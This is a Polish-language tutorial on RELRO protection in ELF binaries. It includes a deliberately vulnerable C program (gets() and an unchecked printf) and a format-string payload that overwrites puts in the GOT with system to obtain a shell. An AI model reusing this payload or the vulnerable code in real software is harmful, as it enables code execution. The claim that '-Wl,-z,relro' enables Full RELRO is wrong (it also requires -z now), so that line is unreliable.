# RELRO
## Opis

`RELRO` - `Relocation Read-Only` to technika zapobiegania nadpisaniu sekcji .got i .got.plt.

Dynamicznie linkowana binarka ELF używa look-up table - Global Offset Table (GOT) do dynamicznego wywoływania funkcji, które znajdują się w bibliotekach współdzielonych.

GOT jest zapełniany dynamicznie, gdy program jest uruchomiony. Przy pierwszym wywołaniu funkcji współdzielonej GOT zawiera wskaźnik powrotny do PLT, gdzie wywoływany jest linker dynamiczny w celu znalezienia rzeczywistego adresu danej funkcji. Znaleziony adres jest następnie zapisywany do GOT.

Jest to `lazy binding`. Mało prawdopodobna jest zmiana lokalizacji współdzielonej funkcji w pamięci, co pozwala zminiejszyć ilość potrzebnych cykli procesora.

Ponieważ GOT istnieje w predefiniowanym miejscu w pamięci, program, który zawiera lukę umożliwiającą atakującemu zapis 4 bajtów w kontrolowanym miejscu w pamięci, może zostać wykorzystany w celu umożliwienia wykonania dowolnego kodu.

Relro występuje w dwóch wersjach:

 - Partial - W częściowym RELRO jedynie część sekcji GOT (.got) jest read only, ale .got.plt jest nadal zapisywalny. Niektóre sekcje (.init_array .fini_array .jcr .dynamic .got) są oznaczone jako read only po ich zainicjowaniu.
 - Full - Lazy binding jest wyłączony. Wszystkie zaimportowane symbole są wywoływane podczas uruchamiania. Cały GOT (oba .got i .got.plt) jest oznaczony jako read only.

Partial RELRO nie ma negatywnego wpływu na wydajność. Używanie Full RELRO jednak ma niewielki wpływ na wydajność podczas uruchamiania aplikacji (ponieważ linker musi wypełnić GOT przed wykonaniem programu).

 ## Clang i GCC
 
 Partial RELRO jest domyślną opcją kompilatorów. Możemy je wyłączyć flagami:
 `-Wl,-z,norelro`
 lub włączyć Full RELRO za pomocą flag:
 `-Wl,-z,relro`
 
## Exploit
W exploicie nadpiszę funkcje `puts` w got co pozwoli na otrzymanie shella.

### Podatna aplikacja
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void func() {
  char input[200];

  printf("Please enter your name: \n");
  gets(input);
  printf(input);

  scanf("%s",input);
  puts(input);
}

int main() {
  func();
  return 0;
}
```
### Krok 1
Na początku odcztyuje adres funkcji system oraz adres puts w got.

![](https://i.imgur.com/GGuXJPF.png)

![](https://i.imgur.com/OZSk6Ik.png)

### Krok 2

Za pomocą exploitu string format znajduję lokalizacje bufora na stosie:

![](https://i.imgur.com/Yix6fwr.png)

oraz przygotowuję adres system podzielony na 4 bajty co umożliwi zapisanie go konstrukcją `%123p%12$n`:

`%64p%15$n%80p%16$n%80p%17$n%23p%18$n"` - adres system gotowy do nadpisania

### Krok 3

Sklejam string nadpisujący adres system z odpowiednimi adresami .got i wysyłam.

```python
payload += b"%64p%15$n%80p%16$n%80p%17$n%23p%18$n"
payload += p32(puts_addr)
payload += p32(puts_addr + 1)
payload += p32(puts_addr + 2)
payload += p32(puts_addr + 3)
```

![](https://i.imgur.com/gJ3FC1o.png)

Eksploit na binarce skompilowanej z Full RELRO kończy się segfaultem.
![](https://i.imgur.com/fVi56BJ.png)

![](https://i.imgur.com/KPqfbr7.png)

## Wnioski

Partial RELRO jest nieinwazyjną ochroną przed niektórymi atakami. Full RELRO spowalnia czas uruchamiania aplikacji więc nie powinniśmy stosować go gdy zależy nam na jak najszybszym starcie. RELRO powinno być używane razem z ASLR, PIE oraz NX dla najlepszych efektów.
